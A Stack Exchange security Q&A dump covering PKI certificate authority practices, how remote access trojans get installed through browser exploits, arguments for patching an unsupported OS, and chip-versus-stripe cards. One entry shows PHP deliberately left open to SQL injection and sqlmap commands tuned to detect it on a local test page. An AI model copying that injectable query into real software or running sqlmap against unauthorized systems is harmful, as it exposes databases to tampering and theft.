<p>As of 2012, this is required if you use MD5 as a hash.  It's still a <a href=""https://security.stackexchange.com/q/15690/396"">good idea if SHA1 or greater</a> is used.  Also see <a href=""http://technet.microsoft.com/en-us/library/cc784789%28v=WS.10%29.aspx"" rel=""nofollow noreferrer"">this Windows 2008R2 ""how to""</a> for more information.</p>

<p><strong>Create a Certificate Practice Statement</strong></p>

<p>A certificate practice statement is a statement of the practices that IT uses to manage the certificates that it issues. It describes how the certificate policy of the organization is interpreted in the context of the system architecture of the organization and its operating procedures. The IT department is responsible for preparing and maintaining the certificate practice statement. (<a href=""http://technet.microsoft.com/en-us/library/cc787545%28v=WS.10%29.aspx"" rel=""nofollow noreferrer"">source</a>)</p>

<p>NOTE: In some situations, such as when digital signatures are used on binding contracts, the certificate practice statement can also be considered a legal statement about the level of security that is provided and the safeguards that are being used to establish and maintain the security level.</p>

<p>For assistance writing a CPS statement, <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=9608"" rel=""nofollow noreferrer"">here is a Microsoft produced ""Job Aid""</a></p>

<p>Best Practice: Although it is possible to put freeform text into this field (see <code>notice</code> below), the ideal solution is to use a URL.  This allows the policy to be updated without reissuing the certificates, it also prevents unneeded bloating of the certificate store. </p>

<pre><code>[LegalPolicy]
OID = 1.3.6.1.4.1.311.21.43
Notice = ""Legal policy statement text""
URL = ""http://www.example.microsoft.com/policy/isspolicy.asp""
</code></pre>

<p><strong>Certificate Policies</strong></p>

<p>Also known as issuance policies, or assurance policies (in MSFT), this is a self defined OID that describes the amount of trust one should put into your certificate (high, med, low, etc).  <a href=""https://security.stackexchange.com/q/26516/396"">See this StackExchange answer</a> for how to properly use this field.</p>

<p><strong>Ensure Application Policies and EKU Policies match</strong></p>

<p><a href=""http://technet.microsoft.com/en-us/library/cc776986%28v=ws.10%29.aspx"" rel=""nofollow noreferrer"">Application Policies</a> is an optional Microsoft convention.  If you are issuing certificates that include both application policy and EKU extensions, ensure that the two extensions contain identical object identifiers.</p>

<p><strong>Enable CRL checking</strong></p>

<p>Normally, a Windows Server 2003 CA will always check revocation on all certificates in the PKI hierarchy (except the root CA certificate) before issuing an end-entity certificate. To disable this feature, use the following command on the CA, and then restart the CA service:</p>

<pre><code> certutil –setreg ca\CRLFlags +CRLF_REVCHECK_IGNORE_OFFLINE  
</code></pre>

<p><strong>CRL Distribution Point</strong></p>

<p><em>Special Guidance for Root CAs</em></p>

<ul>
<li><p>This is optional in a Root CA, and if done incorrectly <a href=""https://security.stackexchange.com/q/15690/396"">it may expose your private key</a>.  </p></li>
<li><p>All CRL publication is done manually from an offline RootCA to all other sub-CA's. An alternative is to <a href=""https://security.stackexchange.com/a/24083/396"">use an audio cable to facilitate one-way communication</a> from the Root to Sub CA's</p></li>
<li><p>It is perfectly acceptable to have the Root CA issue different CRL locations for each issued certificate to subordinate CAs.</p></li>
<li><p>Having a CRL at the root is a best practice if two PKIs trust each other and policy mapping is done.  This permits the certificate to be revoked.</p></li>
</ul>

<p>Getting the CRL ""right"" is pretty important since it's up to each application to do the CRL check.  For example, smart card logon on domain controllers always enforce the revocation check and will reject a logon event if the revocation check cannot be performed or fails.</p>

<blockquote>
  <p>Note If any certificate in the chain cannot be validated or is found to be revoked, the entire chain takes on the status of that one certificate.</p>
</blockquote>

<ul>
<li><p>A self-signed root CA should not list any CDPs.  Most windows applications don't enable the CERT_CHAIN_REVOCATION_CHECK_CHAIN_EXCLUDE_ROOT flag and therefore ignore the CDP (<a href=""http://social.technet.microsoft.com/wiki/contents/articles/4954.certificate-status-and-revocation-checking.aspx"" rel=""nofollow noreferrer"">this is the default validation mode</a>).  If the flag is enabled, and the CDP is blank for the self signed root cert, no error is returned.</p></li>
<li><p>Don't use HTTPS and LDAPS.  These URLs are no longer supported as distribution point references. Reason is that HTTPS and LDAPS URLs use certificates that may or may not be revoked. The revocation checking process can result in revocation loops when HTTPS or LDAPS URLs are used. To determine if the certificate is revoked, the CRL must be retrieved. However, the CRL cannot be retrieved unless the revocation status of the certificates used by HTTPS or LDAPS is determined.</p></li>
<li><p>Consider using HTTP instead of LDAP- Although AD DS enables publication of CRLs to all domain controllers in the forest, implement HTTP instead of LDAP for revocation information publication. Only HTTP enables the use of the <code>ETag</code> and <code>Cache-Control: Max-age</code> headers providing better support for proxies and more timely revocation information. In addition, HTTP provides better heterogeneous support as HTTP is supported by most Linux, UNIX, and network device clients.</p></li>
<li><p>Another reason to not use LDAP is because the revocation window to be smaller.  When using AD LDAP to replicate CA information, the revocation window couldn't be less than the time for all sites in AD to get the CA update.  Oftentimes this replication could take up to 8 hours... that is 8 hours until a smartcard user's access is revoked.  'Todo: the new recommended CRL refresh time is: ?????`</p></li>
<li><p>Make all the URLs highly available (aka don't include LDAP for external hosts).  Windows will slow down the validation process for up to 20 seconds and <a href=""https://serverfault.com/q/394911/51457"">retry the failed connection</a> repeatedly at least as frequently as every 30 min.   I suspect that <a href=""http://technet.microsoft.com/en-us/library/ee619723%28v=ws.10%29"" rel=""nofollow noreferrer"">Pre-fetching</a> will cause this to occur even if the user isn't actively using the site. </p></li>
<li><p>Monitor the size of your CRL.  If the CRL object is so large that CryptoAPI is not able to download the object within the allotted maximum timeout threshold, <a href=""http://social.technet.microsoft.com/wiki/contents/articles/4954.certificate-status-and-revocation-checking.aspx"" rel=""nofollow noreferrer"">a “revocation offline” error is returned and the object download is terminated.</a></p></li>
</ul>

<blockquote>
  <p>Note: CRL distribution over HTTP with ETAG Support may cause issues with IE6 when using Windows 2003 / IIS6, where the TCP connection is continually reset.</p>
</blockquote>

<ul>
<li>(Optional) <a href=""https://security.stackexchange.com/a/82613/396"">Enable Freshest CRL</a>:  This non-critical extension lists the issuers and locations from which to retrieve the delta CRLs. If the “Freshest CRL” attribute is neither present in the CRL nor in the certificate, then the base CRL will be treated as a regular CRL, not as part of a base CRL/delta CRL pair.</li>
</ul>

<p>The Microsoft CA does not put the “Freshest CRL” extension into issued certificates. However, it is possible to add the “Freshest CRL” extension to an issued certificate. You would have to write code to add it to the request, write a custom policy module, or use <code>certutil –setextension</code> on a pending request. For more information about advanced certificate enrollment, see the “Advanced Certificate Enrollment and Management” documentation on the <a href=""http://www.microsoft.com/technet/prodtechnol/windowsserver2003/technologies/security/advcert.mspx"" rel=""nofollow noreferrer"">Microsoft Web site</a></p>

<blockquote>
  <p>Warning If delta CRLs are enabled at a CA, both the base CRL and delta
  CRL must be inspected to determine the certificate’s revocation
  status. If one of the two, or both, are unavailable, the chaining
  engine will report that revocation status cannot be determined, and an
  application may reject the certificate.</p>
</blockquote>

<p><strong>CRL Sizing and maintenance (CRL Partitioning)</strong></p>

<p>The CRL will grow 29 bytes for every certificate that is revoked. Accordingly, revoked certificates will be removed from the CRL when the certificate reaches its original expiration date. </p>

<p>Since renewing a CA cert causes a new/blank  CRL to be generated, Issuing CAs may consider renewing the CA with a new key every 100-125K certificates to maintain a reasonable CRL size. This issuance number is based on the assumption that approximately 10 percent of the issued certificates will be revoked prior to their natural expiration date. If the actual or planned revocation rate is higher or lower for your organization, adjust the key renewal strategy accordingly.  <a href=""http://technet.microsoft.com/library/cc782041.aspx"" rel=""nofollow noreferrer"">More info</a></p>

<p>Also consider partitioning the CRL more frequently if the expiration is more than 1 or two years, as the likelihood of revocation increases.</p>

<p>The drawback to this is increased startup times, as each cert is validated by the server.</p>

<p><strong>CRL Security Precautions</strong></p>

<p>If using a CRL, don't sign the CRL with MD5.  It's also a good idea to <a href=""https://security.stackexchange.com/q/15690/396"">add randomization</a> to the CRL signing key. </p>

<p><strong>Authority Information Access</strong></p>

<p>This field allows the Certificate validation subsystem to download additional certificates as needed if they are not resident on the local computer.</p>

<ul>
<li><p>A self-signed root CA should not list any AIA locations (<a href=""https://security.stackexchange.com/a/24083/396"">see reason here</a>) </p></li>
<li><p>A maximum of five URLs are allowed in the AIA extension for every certificate in the certificate chain. In addition, a maximum of 10 URLs for the entire certificate chain is also supported. This limitation on the number of URLs was added to mitigate the potential use of “Authority Info Access” references in denial of service attacks.</p></li>
<li><p>Don't use HTTP<strong>S</strong> and LDAP<strong>S</strong>.  These URLs are no longer supported as distribution point references. Reason is that HTTPS and LDAPS URLs use certificates that may or may not be revoked. The revocation checking process can result in revocation loops when HTTPS or LDAPS URLs are used. To determine if the certificate is revoked, the CRL must be retrieved. However, the CRL cannot be retrieved unless the revocation status of the certificates used by HTTPS or LDAPS is determined.</p></li>
</ul>

<p><strong>Enable OCSP Validation</strong></p>

<p>The OCSP responder is conventionally located at: <code>http://&lt;fqdn of the ocsp responder&gt;/ocsp</code>.  This url needs to enabled in the AIA.  <a href=""http://blogs.technet.com/b/askds/archive/2009/06/25/implementing-an-ocsp-responder-part-ii-preparing-certificate-authorities.aspx"" rel=""nofollow noreferrer"">See these instructions for Windows.</a></p>

<p>Do know that full OCSP validation is off by default (though it should be ""on"" for EV certs according to the specification).  In addition, enabling OCSP checking <a href=""https://security.stackexchange.com/a/4065/396"">does add latency to the initial connection</a></p>

<p>More secure systems will want to <a href=""https://security.stackexchange.com/q/4071/396"">enable OCSP monitoring on the client or the server side</a> </p>

<p><strong>OCSP Cache duration</strong></p>

<p>All OCSP actions occur over the HTTP protocol and therefore are subject to typical HTTP proxy cache rules.</p>

<p>Specifically the <code>Max-age</code> header defines the maximum time that a proxy server or client will cache a CRL or OCSP response before using a conditional GET to determine whether the object has changed.  Use this information to configure the web server to set the appropriate headers.  Look elsewhere on this page for AD-IIS specific commands for this.</p>

<p><strong>Define a policy in issued certificates</strong></p>

<p>The parent CA defines whether or not to allow CA certificate policies from sub CAs.  It is possible to define this setting when a issuer or application policy needs to be included in a sub CA.</p>

<p>Example polices include an EKU for SmartCards, Authentication, or SSL/Server authentication.</p>

<ul>
<li><p>Beware of certificates without the <code>Certificate Policies</code> extension as it can complicate the Policy Tree.  See RFC 5280 for more information</p></li>
<li><p>Know that policy mappings can replace other policies in the path</p></li>
<li><p>There is a special policy called <code>anypolicy</code> that alters processing</p></li>
<li><p>There are extensions that alter <code>anypolicy</code></p></li>
<li><p>If you use certificate policies, be sure to mark them as <code>critical</code> otherwise the computed <code>valid_policy_tree</code> becomes empty, <a href=""https://security.stackexchange.com/a/19331/396"">turning the policy into a glorified comment.</a></p></li>
</ul>

<p><strong>Monitor the DN length enforcement</strong></p>

<p>The original CCITT spec for the OU field says it should be limited to 64 characters. Normally, the CA enforces x.500 name length standards on the subject extension of certificates for all requests. It is possible that deep OU paths may exceed normal length restrictions.</p>

<p><strong>Cross Certificate Distribution Points</strong></p>

<p>This feature assists where environments need to have two PKIs installed, one for legacy hardware/software that doesn't support modern cryptography, and another PKI for more modern purposes.</p>

<p><strong>Restrict the EKU</strong></p>

<p>In contrast with RFC 5280 that states “in general, [sic] the EKU extension will appear only in end entity certificates."" it's a good idea to put <a href=""http://technet.microsoft.com/en-us/library/cc784789%28v=WS.10%29.aspx"" rel=""nofollow noreferrer"">constraints on the CA Key usage</a>.</p>

<p>A typical stand-alone CA certificate will contain permissions to create Digital Signatures, Certificate Signing, and CRL signing as key values.  This is part of the issue with the FLAME security issue.</p>

<p>The MSFT smart card implementation <a href=""http://support.microsoft.com/kb/959887"" rel=""nofollow noreferrer"">requires either of the following EKUs and possibly a hotfix</a></p>

<ul>
<li>Microsoft smart card EKU </li>
<li>Public Key Cryptography for the Initial Authentication (PKINIT) client Authentication EKU, as defined in the PKINIT RFC 4556</li>
</ul>

<p>It also has interesting constraints around validating EKU (link tbd).   </p>

<p>If you're interested in having any EKU restrictions you should see <a href=""https://security.stackexchange.com/q/15549/396"">this answer regarding OIDs</a> and <a href=""https://security.stackexchange.com/q/15582/396"">this regarding contrained certificates</a></p>

<p><strong>Use caution with Basic Constraints ""Path""</strong></p>

<p>The Basic Constraint <a href=""https://security.stackexchange.com/a/7783/396"">should describe if the certificate is an ""end entity"" or not</a>. Adding a path constraint to a intermediate CA <a href=""https://security.stackexchange.com/a/26543/396"">may not work as expected since it's an uncommon configuration and clients may not honor it.</a>  </p>

<p><strong>Qualified Subordination for Intermediate CAs</strong></p>

<ul>
<li><p>To limit the types of certificates a subCA can offer see <a href=""http://technet.microsoft.com/en-us/library/cc787237%28v=ws.10%29.aspx"" rel=""nofollow noreferrer"">this link</a>, and <a href=""http://technet.microsoft.com/en-us/library/cc782853%28v=ws.10%29.aspx"" rel=""nofollow noreferrer"">this one</a></p></li>
<li><p>If qualified subordination is done, revoking a cross signed root may be difficult since the roots don't update the CRLs frequently.</p></li>
</ul>

<p><strong>Authority Key Identifier / Subject Key Identifier</strong></p>

<p>Note If a certificate’s AKI extension contains a KeyID, CryptoAPI requires the issuer certificate to contain a matching SKI. This differs from RFC 3280 where SKI and AKI matching is <a href=""http://social.technet.microsoft.com/wiki/contents/articles/4954.certificate-status-and-revocation-checking.aspx"" rel=""nofollow noreferrer"">optional</a>.  (todo: Why would someone choose to implement this?)</p>

<p><img src=""https://i.stack.imgur.com/Zg8uq.gif"" alt=""AKI matching to find key parent""></p>

<p><strong>Give the Root and CA a meaningful name</strong></p>

<p>People will interact with your certificate when importing it, reviewing imported certificates, and troubleshooting.  MSFT's recommended practice and <a href=""http://technet.microsoft.com/en-us/library/cc751157.aspx"" rel=""nofollow noreferrer"">requirement</a> is that the root has a meaningful name that identifies your organisation and not something abstract and common like CA1.</p>

<p>This next part applies to names of Intermediate/subCA's that will be constrained for a particular purpose: Authentication vs Signing vs Encryption</p>

<p>Surprisingly, End users and technicians who don't understand PKI's nuances will interact with the server names you choose more often than you think if you use S/MIME or digital signatures (etc).</p>

<p>I personally think it's a good idea to rename the issuing certificates to something more user friendly such as <code>""Company Signer 1""</code> where I can tell at a glance </p>

<ul>
<li>Who is the signature going to come from (Texas A&amp;M or their rival)</li>
<li>What is it used for? Encryption vs Signing</li>
</ul>

<blockquote>
  <p>It's important to tell the difference between a message that was encrypted between two parties, and one that was signed.  One example where this is important is if I can get the recipient to echo a statement I send to them.  User A could tell user B ""A, I owe you $100"".  If B responded with an echo of that message with the wrong key, then they effectively digitally notarized (vs just encrypting) a fictitious $100 debt.</p>
</blockquote>

<p>Here is a sample user dialog for <a href=""https://security.stackexchange.com/q/82859/396"">S/MIME</a>.  Expect similar UIs for Brower based certificates.  Notice how the Issuer name isn't user friendly.</p>

<p><img src=""https://i.stack.imgur.com/dCnXz.jpg"" alt=""Select a SMIME certificate.. really?""></p>

<p><strong>Alternate Encodings</strong></p>

<p>Note: Speaking of names, if any link in the chain uses an alternate encoding, then clients may not be able to verify the issuer field to the subject.  Windows does not normalize these strings during a comparison so make sure the names of the CA are identical from a binary perspective (as opposed to the RFC recommendation).</p>

<p><img src=""https://i.stack.imgur.com/kkZ0q.gif"" alt=""Name matching to find key parent""></p>

<p><strong>High Security/Suite B Deployments</strong></p>

<ul>
<li><p>Here is <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=14551"" rel=""nofollow noreferrer"">information regarding the Suite B algorithms supported in Windows 2008 and R2</a></p>

<p>ALGORITHM                                          SECRET           TOP SECRET</p>

<p>Encryption:
Advanced Standard (AES)                            128 bits         256 bits</p>

<p>Digital Signature:
Elliptic Curve Digital Signature Algorithm (ECDSA) 256 bit curve.   384 bit curve</p>

<p>Key Exchange:
Elliptic Curve Diffie-Hellman (ECDH)               256 bit curve.   384 bit curve</p>

<p>Hashing:
Secure Hash Algorithm (SHA)                        SHA-256           SHA-384</p></li>
<li><p>For Suite B compliance, the <code>ECDSA_P384#Microsoft Software Key Service Provider</code> as well as the <code>384</code> key size and <code>SHA384</code> as the hash algorithm may also be selected if the level of classification desired is Top Secret.  The settings that correspond with the required level of classification should be used. <code>ECDSA_P521</code> is also available as an option.  While the use of a 521 bit ECC curve may exceed the cryptographic requirements of Suite B, due to the non-standard key size, 521 is not part of the official Suite B specification.</p></li>
</ul>

<p><strong>PKCS#1 v2.1</strong> </p>

<ul>
<li><p>XP clients and many non-windows systems <a href=""http://social.technet.microsoft.com/Forums/en-US/winserversecurity/thread/561d0fcb-3879-4297-9ff0-d4d14fa01634"" rel=""nofollow noreferrer"">do not support this new signature format.</a>  This should be disabled if older clients need to be supported. <a href=""http://technet.microsoft.com/en-us/library/cc753169.aspx"" rel=""nofollow noreferrer"">More Info</a></p></li>
<li><p>I would only recommend using it once you move to ECC algorithms for asymmetric encryption. (<a href=""http://social.technet.microsoft.com/Forums/en-US/winserversecurity/thread/faa2c31c-c50f-4083-a641-eff41d7e1b39"" rel=""nofollow noreferrer"">source</a>)</p></li>
</ul>

<p><strong>Protect Microsoft CA DCOM ports</strong></p>

<p>The Windows Server 2003 CA does not enforce encryption on the ICertRequest or ICertAdmin DCOM interfaces by default. Normally, this setting is not required except in special operational scenarios and should not be enabled. Only Windows Server 2003 machines by default support DCOM encryption on these interfaces. For example, Windows XP clients will not by default enforce encryption on certificate request to a Windows Server 2003 CA. <a href=""http://technet.microsoft.com/en-us/library/cc784789%28v=WS.10%29.aspx"" rel=""nofollow noreferrer"">source</a></p>

<p><strong>CNG private key storage vs CSP storage</strong></p>

<p>If you enroll Certificate Template v3, the private key goes into the CNG private key storage on the client computer. If you enroll Certificate Template v2 or v1, the private key goes into CSP storage.   The certificates will be visible to all applications in both cases, but not their private keys - so most applications will show the certificate as available, but will not be able to sign or decrypt data with the associated private key unless they support CNG storage.</p>

<p>You cannot distinguish between CNG and CSP storages by using the Certificate MMC. If you want to see what storage a particular certificate is using, you must use <code>CERTUTIL -repairstore my *</code> (or <code>CERTUTIL -user -repairstore my *</code>) and take a look at the Provider field. If it is saying ""... Key Storage Provider"", than it is CNG while all other providers are CSP.</p>

<p>If you create the initial certificate request manually (Create Custom Request in MMC), you can select between ""CNG Storage"" and ""Legacy Key"" where legacy means CSP.
The following is my experience-based list of what does not support CNG - you cannot find an authoritative list anywhere, so this arrises from my investigations over time:</p>

<ul>
<li>EFS
 Not supported in Windows 2008/Vista, Supported in Windows 7/2008R2</li>
<li>user encryption certificates</li>
<li><p>VPN/WiFi Client (EAPTLS, PEAP Client)</p></li>
<li><p>Windows 2008/7
  Not supported with user or computer certificate authentication</p></li>
<li>TMG 2010
  server certificates on web listeners</li>
<li>Outlook 2003
  user email certificates for signatures or encryption</li>
<li>Kerberos
  Windows 2008/Vista- DC certificates</li>
<li>System Center Operations Manager 2007 R2</li>
<li>System Center Configuration Manager 2007 R2</li>
<li>SQL Server 2008 R2-</li>
<li>Forefront Identity Manager 2010 Certificate Management</li>
</ul>

<p><a href=""http://www.sevecek.com/Lists/Posts/Post.aspx?ID=40"" rel=""nofollow noreferrer"">More information on CNG compatibility is listed here</a> (in Czech, though Chrome handles the auto-translation well)</p>

<p><strong>Smart Cards &amp; Issuing CAs</strong></p>

<p>If you plan on giving users a second smart card for authentication, use a second issuer CA for that. <a href=""http://technet.microsoft.com/en-us/library/ee844195%28v=ws.10%29.aspx"" rel=""nofollow noreferrer"">Reason: Windows 7 requirements</a></p>

<p>Use the Windows command <code>CERTUTIL -viewstore -enterprise NTAuth</code> for troubleshooting Smartcard logins.  The local NTAuth store is the result of the last Group Policy download from the Active Directory NTAuth store. It is the store used by smart card logon, so viewing this store can be useful when troubleshooting smart card logon failures.</p>

<p><strong>Decommissioning a PKI Tree</strong></p>

<p>If you deploy two PKI trees, with the intent to decommission the legacy tree at some point (where all old devices have become obsolete or upgraded) it may be a good idea to set the CRL Next Update field to Null.  This will (should?) prevent the continual polling for new CRLS to the clients.  The reasoning is that once the PKI is decommissioned, there will be no more administration, and no more revoked certs.  All remaining certs are simply left to expire.</p>

<p><a href=""http://blogs.technet.com/b/pki/archive/2012/01/27/steps-needed-to-decommission-an-old-certification-authority-without-affecting-previously-issued-certificates-and-then-switching-all-operations-to-a-new-certification-authority.aspx"" rel=""nofollow noreferrer"">More information on PKI decommissioning available here</a></p>
","15534"
"How does Remote Access Trojan / Backdoor Software work?","19689","","<p>How does a RAT works? I understand it as once we visit the infected website, the browser might download the Trojan to our PC automatically. Will it be executed and auto-installed in our computer? </p>

<p>I can't see how JavaScript can run the malicious code and automatically install the RAT into our/visitors PC and gaining access to their PC. </p>

<p>Does it work like this? </p>

<ol>
<li>Hackers uploaded the exe file to an exploit server. </li>
<li>Visitors visit the server/hackers send the affected website link to the
particular victims. </li>
<li>The malicious code is written in js file and the js file will be automatically downloaded to visitor's PC (C:\users\pcname\AppData\Local\Temp) </li>
<li>The js file automatically installs the RAT Program?  </li>
<li>The RAT program will auto send the victim's IP address and username/password to the hackers each time the visitor is online?</li>
</ol>
","<blockquote>
  <p>I can't see how a javascript can run the malicious code and automatic install the RAT into our/visitors PC and gaining access to their PC.</p>
</blockquote>

<p>Javascript in and of itself cannot - the implementation of javascript usually has very, very limited access to the local system by design. That's assuming all works as designed.</p>

<p>Software systems rarely do; the larger the piece of software, the more likely bugs are to creep in. If one of those bugs happens to let you run arbitrary code, that's a problem.</p>

<p>To be clear, this arbitrary code is typically actually a specially crafted piece of input into the program. For example, let's assume there's a bug in the <code>.image</code> renderer (a file type we've made up for the purposes) where I read data that should look like this:</p>

<pre><code>FF 00 99 00 00 00
</code></pre>

<p>For reasons unknown, I've chosen to do crazy things like storing this RGB code in strings and am assuming string terminates with <code>00</code> and there's actually only one character. I don't know, maybe I'm anticipating bazillion colour screens. This may be a poor example. It's late. Bear with me. Anyway, let's assume I just use standard string functions in by renderer to copy that information out of the file. Now, if I send a valid file, great. However as an attacker, I could send a file that looks like this:</p>

<pre><code>FF 00 99 11 11 11 11 11 11 &lt;lots of 11s&gt; 11 11 &lt;some code&gt; 00
</code></pre>

<p>How could I send that file? Easy. Include it in the html of the web page with bog standard <code>img</code> tags. The browser will then open/render the image (as it does with jpgs, pngs etc) and my broken dodgy code happily executes that buffer overflow. I might even be sneaky and <code>display: none;</code> it via css, but only if the browser still processes it.</p>

<p>At this point, those instructions in <code>&lt;some code&gt;</code> get executed, which allows me to do whatever I need to. Typically, this downloads an executable of some sort and runs it, which means the exploit only needs to be small and I can download something meatier if the exploit worked.</p>

<p>From there, the ""payload"" can begin attempting to elevate privileges and installing backdoors. You already have a good answer on what a backdoor could do and how it might work.</p>

<p>I've chosen to make up an image file with a very simple mistake nobody should make; however, in the real world there are all sorts of media which have very complex results:</p>

<ul>
<li>Javascript - it's a programming language, needs parsing etc.</li>
<li>PDF - a document format with bells and whistles, also includes javascript.</li>
<li>PNG/JPG/GIF - I'd expect a bug in these to be rare, but I believe it has happened (not sure if it caused a remote execution vulnerability though).</li>
<li>More complex movie formats, e.g. MP4 etc.</li>
<li>Flash. </li>
</ul>

<p>Now, two scenarios are slightly more complicated:</p>

<ul>
<li>Java applets allow arbitrary code execution - in Java. There are three possible outcomes here:
<ul>
<li>You can avoid the signing dialog display via some mechanism and so load your class without user interaction, giving you the ability to download/exec code.</li>
<li>You can find a bug in the classloader or jar parser that you can exploit.</li>
<li>There is some bug in the Java language and/or runtime you can convince the user to use.</li>
</ul></li>
<li>ActiveX controls: these are, effectively, DLLs or EXEs with ""special magic"". It's Open Season with one of these; the only barrier here is avoiding (by getting a valid signature, social engineering or a bug) the authenticode (code signing) screen you (should) get before running one.</li>
</ul>

<p>Baaasically, the browser environment is incredibly complicated and there are a lot of moving parts that must all read untrusted input and correctly handle it.</p>

<p>Now, where does Javascript come into the mix? Well, it might not contain the vulnerability itself, but it certainly can <a href=""https://panopticlick.eff.org/"" rel=""nofollow"">enumerate lots of useful client side information</a> to determine what vulnerability to send - much more than simply the browser version. This could be part of the attacker's landing page, for example, to decide what if any exploits can be run.</p>

<p>Now, that little comment of Rory's:</p>

<blockquote>
  <p>Point 5 is dramatically understating what the attacker can do.</p>
</blockquote>

<p>Massively, really, megarly (that's a word now) understating what the attacker can do. Since a remote access trojan has full control of your PC, a few things an attacker may do:</p>

<ul>
<li>Install further code, on demand, to carry out or co-ordinate attacks on other systems. This is commonly referred to as being part of a botnet.</li>
<li>Harvest any interesting-looking information from the current system.</li>
<li>Go around damaging things. Quite rare these days.</li>
<li>Drop payloads onto any media/medium likely to enable the attacker to an exploit another system, e.g. infecting all USB drives that are plugged in.</li>
</ul>

<p>The possibilities are pretty limitless; the first point is actually reasonably likely, as is the last.</p>

<p><strong>I can haz tl;dr?</strong></p>

<p>Javascript is usually used to perform reconnaissance on the target system; beyond that, an exploit allowing arbitrary code execution must exist in the browser or one of its plugins. From there, you can persuade the computer to download more information, and from there, the computer is your oyster.</p>
","19446"
"How can I argue against: ""System is unhackable so why patch vulnerabilities?""","19689","","<p>An operating system has reached End of Support (EoS) so no more security patches are coming for the OS ever.  An embedded device running this OS needs to be updated to a newer version.  However, the engineers who designed the original product feel that the machine is not hackable and therefore does not need to be patched.  The device has WiFi, Ethernet, USB ports and an OS that has reached EoS. </p>

<p>The questions I am asked daily:</p>

<ol>
<li>We have application white-listing so why do we need to patch vulnerabilities?</li>
<li>We have a firewall so why do we need to patch vulnerabilities?</li>
</ol>

<p>And the comments I get:</p>

<p>Our plan is to harden the system even more.  If we do this then we should not have to update the OS and continue patching it.  No one will be able to reach the vulnerabilities.  Also we will fix the vulnerabilities in outward-facing parts of the OS (even though there is no ability for them to patch the vulnerabilities themselves) and then we can leave the non-outside facing vulnerabilities unpatched.</p>

<p>I have explained in detail about Nessus credentialed scans. I am not sure how to get my point across to these engineers.  Any thoughts on how I can explain this? </p>

<p><strong>UPDATE:</strong>  The system is being patched.  Thanks for everyones responses and help.  </p>
","<p>The trouble with the situation (as you are reporting it) is that there are a lot of assumptions being made with a lot of opinions. You have your opinions and you want them to share your opinions, but they have their own opinions. </p>

<p>If you want to get everyone to agree to something, you need to find common ground. You need to challenge and confirm each assumption and find hard data to support your opinion or theirs. Once you have common ground, then you can all move forward together.</p>

<ol>
<li>You have whitelisting: great, what does that mean? Are there ways around it? Can a whitelisted application be corrupted?</li>
<li>What does the firewall do? How is it configured? Firewalls mean blocked ports, but they also mean <em>allowed</em> ports. Can those allowed ports be abused? </li>
<li>No one has access? Who has access to the device? Are you trusting an insider or the ignorance of a user to keep it secure?</li>
<li>What happens if someone gets local access to the device? How likely is that?</li>
</ol>

<p>As an information security professional, your job is not to beat people over the head with ""best practices"" but to perform risk analyses and design a way forward that limits risk under the risk threshold in a cost-effective way. You have to justify <em>not</em> employing best practices, but if the justification is valid, then it's valid.</p>
","175978"
"Why can't sqlmap find an SQL injection in my code?","19673","","<p>I installed <a href=""http://www.apachefriends.org/en/xampp.html"" rel=""noreferrer"">XAMPP</a> on my development PC, and started Apache HTTP server and MySQL.</p>

<p>It comes with a test page ""CD collection"", with the following back-end PHP code:</p>

<pre><code>mysql_query(""DELETE FROM cds WHERE id="".round($_REQUEST['id']));
</code></pre>

<p>I'm not an expert in PHP, I'm guessing the <code>round</code> call is there to prevent SQL injection.  So I removed it from the PHP code, leaving the following:</p>

<pre><code>mysql_query(""DELETE FROM cds WHERE id="".$_REQUEST['id']);
</code></pre>

<p>I verified that I can modify the query parameters in the URL to do whatever I like to the database, so the SQL injection vulnerability is definitely there.</p>

<p>Now I'm trying to use <code>sqlmap</code> to find the SQL injection vulnerability.  I run it like this:</p>

<pre><code>python sqlmap.py -u ""http://127.0.0.1/xampp/cds.php?action=del&amp;id=14""
</code></pre>

<p>But it returns the following:</p>

<blockquote>
  <p>[16:01:47] [WARNING] GET parameter 'id' is not injectable [16:01:47]
  [CRITICAL] all parameters are not injectable, try to increase
  --level/--risk values to perform more tests. Rerun without providing the --te chnique switch. Give it a go with the --text-only switch if
  the target page has a low percentage of textual content (~15.27% of
  page content is text)</p>
</blockquote>

<p>Any idea of what I may be doing wrong?</p>
","<p>There is a huge probability, that your server doesn't display any errors/warnings. Sqlmap tries to inject sql inj.-like payloads and observes the webapp ""state"". As sqlmap hasn't got an access to your vulnerable code or DB content it could just only guess the potential vulnerability by observing webapp behaviour – in this case „visual” behaviour (no warnings/errors – no potential sql-inj.).</p>

<p>However, sqlmap gave you pretty nice hint: try to increase level/risk values:</p>

<pre><code>    python sqlmap.py -u ""http://..."" --level=3 --risk=3
</code></pre>

<p>after that change you will increase the amount of payloads (sent to your webapp) and you will find blind sql.inj!. It means that on level 3 (and --risk=3) sqlmap doesn't check only „visible” effects. It uses some time-taking operation [BENCHMARK()] which delays server response if sql. Inj. occurs.</p>
","15713"
"Why does my debit card have a stripe AND a chip?","19646","","<p>Recently I received a new debit card which has both a magnetic stripe and a chip (as did my previous card).</p>

<p>I know the magnetic stripe can be easily copied whereas the chip system hasn't been compromised (yet?). I suppose the stripe is still there for legacy purposes, even though in the last years I've not seen nor heard of a terminal or ATM that didn't accept chip payment.</p>

<p>As far as I am concerned, that's like buying a new fancy lock for your front door while leaving the back door unlocked. Is that analogy right, i.e. is a card with a stripe AND chip no more secure than a card with just a stripe? And if so, why would my bank allow such a security risk? Why not get rid of the stripe altogether?</p>

<p>Ps: If it matters, I live in the Netherlands.</p>

<p>EDIT: For clarity, I'm mostly concerned about the following scenario:</p>

<p>A thief skims an ATM (probably (?) chip payment), but can still get the stripe because the card goes into the ATM. Suppose he reads my PIN too. He then fabricates a new card and empties my bank account.</p>
","<p>Details depend on bank, card type and country, so they vary quite a lot, but the generic model is the following:</p>

<ul>
<li>The magnetic stripe contains, mostly, a computer-readable copy of the information embossed on the card: account number, holder name, expiration date.</li>
<li>The chip contains a secret key which is used to ""sign"" (not necessarily a true signature; often a <a href=""https://en.wikipedia.org/wiki/Message_authentication_code"">MAC</a>) transactions.</li>
<li>The chip knows the PIN code and refuses to work until the PIN code has been presented; it also locks itself if too many wrong PIN codes are presented.</li>
</ul>

<p>When a payment terminal uses the magnetic strip, it <em>must</em> talk to the bank, establish a secure tunnel with the bank, send the PIN code entered by the user, and verify that the owner's account has enough money on it.</p>

